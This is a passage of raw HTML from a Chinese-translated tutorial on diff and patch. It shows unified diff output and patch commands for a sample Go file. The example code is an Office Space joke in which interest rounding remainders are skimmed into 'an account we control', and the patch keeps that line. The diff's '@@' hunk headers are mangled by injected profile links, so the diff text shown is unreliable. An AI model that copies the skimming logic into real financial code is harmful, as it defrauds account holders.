开发的源代码控制系统，它支持分布式开发模型以及允许独立于主要代码仓库的补丁包，这些补丁包能被推送或拉取到不同的源代码树上，并遵守这些代码树各自的开发流程。）</p>\n<p>在继续我们的话题之前，我们当然不能忽略和补丁和差异这个概念相关的最流行的服务：<a href=\"https://github.com/\">GitHub</a>。从它的名字就能猜想出 GitHub 是基于 Git 的，而且它还围绕着 Git 对分布式开源代码开发模型提供了基于 Web 和 API 的工作流管理。（LCTT 译注：即拉取请求Pull Request）。在 GitHub 上，分享补丁的方式不是像 Linux 内核社区那样通过邮件列表，而是通过创建一个 <strong>拉取请求</strong> 。当你提交你自己的源代码树的改动时，你能通过创建一个针对软件项目的共享仓库的“拉取请求”来分享你的代码改动（LCTT 译注：即核心开发者维护一个主仓库，开发者去“复刻fork”这个仓库，待各自的提交后再创建针对这个主仓库的拉取请求，所有的拉取请求由主仓库的核心开发者批准后才能合入主代码库。）GitHub 被当今很多活跃的开源社区所采用，如 <a href=\"https://kubernetes.io/\">Kubernetes</a>、<a href=\"https://www.docker.com/\">Docker</a>、<a href=\"https://github.com/containernetworking/cni\">容器网络接口 (CNI)</a>、<a href=\"https://istio.io/\">Istio</a> 等等。在 GitHub 的世界里，用户会倾向于使用基于 Web 页面的方式来审核一个拉取请求里的补丁或差异，你也可以直接访问原始的补丁并在命令行上直接使用它们。</p>\n<h3 id=\"toc_2\">该说点干货了</h3>\n<p>我们前面已经讲了在流行的开源社区里是怎么应用补丁和差异的，现在看看一些例子。</p>\n<p>第一个例子包括一个源代码树的两个不同副本，其中一个有代码改动，我们想用 <code>diff</code> 来看看这些改动是什么。这个例子里，我们想看的是“合并格式unified”的补丁，这是现在软件开发世界里最通用的格式。如果想知道更详细参数的用法以及如何生成差异文件，请参考 <code>diff</code> 手册。原始的代码在 <code>sources-orig</code> 目录，而改动后的代码在 <code>sources-fixed</code> 目录。如果要在你的命令行上用“合并格式”来展示补丁，请运行如下命令。（LCTT 译注：参数 <code>-N</code> 代表如果比较的文件不存在，则认为是个空文件， <code>-a</code> 代表将所有文件都作为文本文件对待，<code>-u</code> 代表使用合并格式并输出上下文，<code>-r</code> 代表递归比较目录）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6701e98ab352287089\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ diff -Naur sources-orig/ sources-fixed/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ab352287089-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6701e98ab352287089-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">diff</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">Naur </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fixed</span><span class=\"crayon-o\">/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>……下面是 <code>diff</code> 命令的输出：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6701e98ba088279079\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndiff -Naur sources-orig/officespace/interest.go sources-fixed/officespace/interest.go\r\n--- sources-orig/officespace/interest.go        2018-08-10 16:39:11.000000000 -0400\r\n+++ sources-fixed/officespace/interest.go       2018-08-10 16:39:40.000000000 -0400\r\n&lt;a href=\"http://www.jobbole.com/members/weiboyutao1302\"&gt;@@&lt;/a&gt; -11,15 +11,13 &lt;a href=\"http://www.jobbole.com/members/weiboyutao1302\"&gt;@@&lt;/a&gt;\r\n   InterestRate float64\r\n }\r\n\r\n+// compute the rounded interest for a transaction\r\n func computeInterest(acct *Account, t Transaction) float64 {\r\n\r\n   interest := t.Amount * t.InterestRate\r\n   roundedInterest := math.Floor(interest*100) / 100.0\r\n   remainingInterest := interest - roundedInterest\r\n\r\n-  // a little extra..\r\n-  remainingInterest *= 1000\r\n-\r\n   // Save the remaining interest into an account we control:\r\n   acct.Balance = acct.Balance + remainingInterest</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98ba088279079-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98ba088279079-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-1\"><span class=\"crayon-v\">diff</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">Naur </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">officespace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">interest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">go </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fixed</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">officespace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">interest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">go</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-2\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">officespace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">interest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">go</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11.000000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-3\"><span class=\"crayon-o\">++</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fixed</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">officespace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">interest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">go</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40.000000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-4\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"http://www.jobbole.com/members/weiboyutao1302\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-sy\">@</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">13</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"http://www.jobbole.com/members/weiboyutao1302\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-sy\">@</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-5\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-e\">InterestRate </span><span class=\"crayon-i\">float64</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-6\"> <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-8\"><span class=\"crayon-o\">+</span><span class=\"crayon-c\">// compute the rounded interest for a transaction</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-9\"> <span class=\"crayon-e\">func </span><span class=\"crayon-e\">computeInterest</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">acct *</span><span class=\"crayon-v\">Account</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Transaction</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">float64</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-11\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-v\">interest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">Amount *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">InterestRate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-12\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-v\">roundedInterest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Floor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">interest*</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100.0</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-13\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-v\">remainingInterest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">interest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">roundedInterest</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-14\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-15\"><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span> <span class=\"crayon-c\">// a little extra..</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-16\"><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span> <span class=\"crayon-e \">remainingInterest *</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-17\"><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98ba088279079-18\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-c\">// Save the remaining interest into an account we control:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6701e98ba088279079-19\"> <span class=\"crayon-h\"> </span> <span class=\"crayon-v\">acct</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Balance</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">acct</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Balance</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">remainingInterest</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p>最开始几行 <code>diff</code> 命令的输出可以这样解释：三个 <code>---</code> 显示了原来文件的名字；任何在原文件（LCTT 译注：不是源文件）里存在而在新文件里不存在的行将会用前缀 <code>-</code>，用来表示这些行被从源代码里“减去”了。而 <code>+++</code> 表示的则相反：在新文件里被加上的行会被放上前缀 <code>+</code>，表示这是在新文件里被“加上”的行。补丁文件中的每一个补丁“块”（用 <code>@@</code> 作为前缀的的部分）都有上下文的行号，这能帮助补丁工具（或其它处理器）知道在代码的哪里应用这个补丁块。你能看到我们已经修改了“Office Space”这部电影里提到的那个函数（移除了三行并加上了一行代码注释），电影里那个有点贪心的工程师可是偷偷的在计算利息的函数里加了点“料”哦。（LCTT译注：剧情详情请见电影 <a href=\"https://movie.douban.com/subject/1296424/%EF%BC%89\">https://movie.douban.com/subject/1296424/）</a></p>\n<p>如果你想找人来测试你的代码改动，你可以将差异保存到一个补丁里：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6701e98c4344591431\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ diff -Naur sources-orig/ sources-fixed/ &gt;myfixes.patch</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98c4344591431-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6701e98c4344591431-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">diff</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">Naur </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sources</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fixed</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">myfixes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">patch</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在你有补丁 <code>myfixes.patch</code> 了，你能把它分享给别的开发者，他们可以将这个补丁打在他们自己的源代码树上从而得到和你一样的代码并测试他们。如果一个开发者的当前工作目录就是他的源代码树的根的话，他可以用下面的命令来打补丁：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6701e98cb265972819\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ patch -p1 &lt; ../myfixes.patch\r\npatching file officespace/interest.go</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6701e98cb265972819-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6701e98cb265972819-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6701e98cb265972819-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">patch</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">myfixes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">patch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6701e98cb265972819-2\"><span class=\"crayon-e\">patching </span><span class=\"crayon-e\">file </span><span class=\"crayon-v\">officespace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">interest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">go</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在这个开发者的源代码树已经打好补丁并准备好构建和测试文件的修改了。那么如果这个开发者在打补丁之前已经改动过了怎么办？只要这些改动没有直接冲突（LCTT 译注：比如改在同一行上），补丁工具就能自动的合并代码的改动。例如下面的interest.go 文件，它有其它几处改动，然后它想打上 <code>myfixes.patch</code> 这个补丁：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6701e98d1210157047\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ patch -p1 &lt; ../myfixes.patch\r\npatching file officespace/interest.go\r\nHunk #1 succeeded at 26 (offset 15 lines).</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table 